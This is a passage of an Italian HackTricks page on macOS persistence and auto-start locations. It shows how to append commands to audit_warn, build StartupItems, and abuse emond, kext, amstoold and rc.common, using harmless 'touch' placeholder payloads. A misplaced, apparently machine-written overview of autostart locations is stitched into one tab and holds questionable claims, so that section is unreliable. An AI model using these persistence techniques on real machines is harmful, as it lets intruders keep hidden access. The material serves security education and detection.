#### Descrizione ed Exploit

Ogni volta che auditd rileva un avviso, lo script **`/etc/security/audit_warn`** viene **eseguito**. Quindi è possibile aggiungere il proprio payload al suo interno.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Potresti forzare un avviso con `sudo audit -n`.

### Elementi di avvio

{% hint style="danger" %}
**Questo è deprecato, quindi non dovrebbe essere trovato in quelle directory.**
{% endhint %}

Lo **StartupItem** è una directory che dovrebbe essere posizionata all'interno di `/Library/StartupItems/` o `/System/Library/StartupItems/`. Una volta creata questa directory, deve contenere due file specifici:

1. Uno **script rc**: uno script shell eseguito all'avvio.
2. Un file **plist**, specificamente chiamato `StartupParameters.plist`, che contiene diverse impostazioni di configurazione.

Assicurati che lo script rc e il file `StartupParameters.plist` siano posizionati correttamente all'interno della directory **StartupItem** affinché il processo di avvio li riconosca e li utilizzi.


{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% tab title="superservicename" %}

# Posizioni di avvio automatico di macOS

In macOS, ci sono diverse posizioni in cui è possibile configurare l'avvio automatico di un'applicazione o di un servizio. Queste posizioni possono essere sfruttate da un hacker per eseguire un'applicazione o un servizio dannoso all'avvio del sistema.

## 1. LaunchAgents

Le LaunchAgents sono file di tipo .plist che specificano quali applicazioni o servizi devono essere avviati automaticamente quando un utente accede al sistema. Questi file sono posizionati nella directory `~/Library/LaunchAgents` o `/Library/LaunchAgents`.

## 2. LaunchDaemons

I LaunchDaemons sono simili alle LaunchAgents, ma vengono eseguiti a livello di sistema anziché a livello utente. Questi file sono posizionati nella directory `/Library/LaunchDaemons` o `/System/Library/LaunchDaemons`.

## 3. Login Items

I Login Items sono applicazioni o servizi che vengono avviati automaticamente quando un utente accede al sistema. Queste impostazioni possono essere configurate nelle preferenze di sistema di macOS.

## 4. Cron Jobs

I Cron Jobs sono script o comandi che vengono eseguiti automaticamente in determinati intervalli di tempo. Questi job possono essere configurati utilizzando il comando `crontab` o i file di configurazione nella directory `/etc/cron.*`.

## 5. Startup Items

I Startup Items sono applicazioni o servizi che vengono avviati automaticamente all'avvio del sistema. Queste impostazioni possono essere configurate nella directory `/Library/StartupItems` o `/System/Library/StartupItems`.

## 6. XPC Services

Le XPC Services sono servizi che vengono eseguiti in background e possono essere avviati automaticamente all'avvio del sistema. Questi servizi sono specificati nei file di configurazione nella directory `/Library/LaunchAgents` o `/System/Library/LaunchAgents`.

## 7. Kernel Extensions

Le Kernel Extensions sono estensioni del kernel che possono essere utilizzate per avviare servizi o applicazioni all'avvio del sistema. Queste estensioni sono posizionate nella directory `/System/Library/Extensions`.

## 8. LaunchAtLogin

LaunchAtLogin è un framework che consente alle applicazioni di essere avviate automaticamente all'accesso dell'utente. Questa funzionalità può essere utilizzata da un'applicazione dannosa per avviarsi automaticamente all'accesso del sistema.

## 9. Other Locations

Oltre alle posizioni menzionate sopra, ci possono essere altre posizioni personalizzate in cui è possibile configurare l'avvio automatico di un'applicazione o di un servizio. Queste posizioni possono variare a seconda delle configurazioni personalizzate del sistema.

È importante tenere presente che un hacker può sfruttare queste posizioni di avvio automatico per eseguire applicazioni o servizi dannosi all'avvio del sistema. Pertanto, è consigliabile verificare regolarmente queste posizioni e rimuovere eventuali voci sospette o non autorizzate.
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### emond

{% hint style="danger" %}
Non riesco a trovare questo componente nel mio macOS, quindi per ulteriori informazioni consulta il writeup
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Introdotto da Apple, **emond** è un meccanismo di registrazione che sembra essere poco sviluppato o forse abbandonato, ma rimane accessibile. Sebbene non sia particolarmente utile per un amministratore Mac, questo servizio oscuro potrebbe fungere da metodo di persistenza sottile per gli attori minaccia, probabilmente passando inosservato alla maggior parte degli amministratori di macOS.

Per coloro che ne sono consapevoli, identificare eventuali utilizzi maligni di **emond** è semplice. Il LaunchDaemon di sistema per questo servizio cerca script da eseguire in una singola directory. Per ispezionare ciò, è possibile utilizzare il seguente comando:
```bash
ls -l /private/var/db/emondClients
```
### XQuartz

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Posizione

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Richiede privilegi di root
* **Trigger**: Con XQuartz

#### Descrizione ed Exploit

XQuartz **non è più installato in macOS**, quindi se desideri ulteriori informazioni consulta il writeup.

### kext

{% hint style="danger" %}
È così complicato installare kext anche come root che non lo considererò per sfuggire alle sandbox o persino per la persistenza (a meno che tu non abbia un exploit)
{% endhint %}

#### Posizione

Per installare un KEXT come elemento di avvio, è necessario **installarlo in una delle seguenti posizioni**:

* `/System/Library/Extensions`
* File KEXT incorporati nel sistema operativo OS X.
* `/Library/Extensions`
* File KEXT installati da software di terze parti

È possibile elencare i file kext attualmente caricati con:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Per ulteriori informazioni sulle **estensioni del kernel, controlla questa sezione**.

### ~~amstoold~~

Descrizione: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Posizione

* **`/usr/local/bin/amstoold`**
* Richiede privilegi di root

#### Descrizione ed exploit

Apparentemente il `plist` da `/System/Library/LaunchAgents/com.apple.amstoold.plist` stava utilizzando questo binario mentre esponeva un servizio XPC... il problema è che il binario non esisteva, quindi potevi inserire qualcosa lì e quando il servizio XPC veniva chiamato, il tuo binario sarebbe stato chiamato.

Non riesco più a trovare questo nel mio macOS.

### ~~xsanctl~~

Descrizione: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Posizione

* **`/Library/Preferences/Xsan/.xsanrc`**
* Richiede privilegi di root
* **Trigger**: Quando il servizio viene eseguito (raramente)

#### Descrizione ed exploit

Apparentemente non è molto comune eseguire questo script e non sono riuscito nemmeno a trovarlo nel mio macOS, quindi se vuoi ulteriori informazioni consulta il writeup.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**Questo non funziona nelle versioni moderne di MacOS**
{% endhint %}

È anche possibile inserire qui **comandi che verranno eseguiti all'avvio**. Esempio di uno script rc.common regolare:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Tecniche e strumenti di persistenza

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
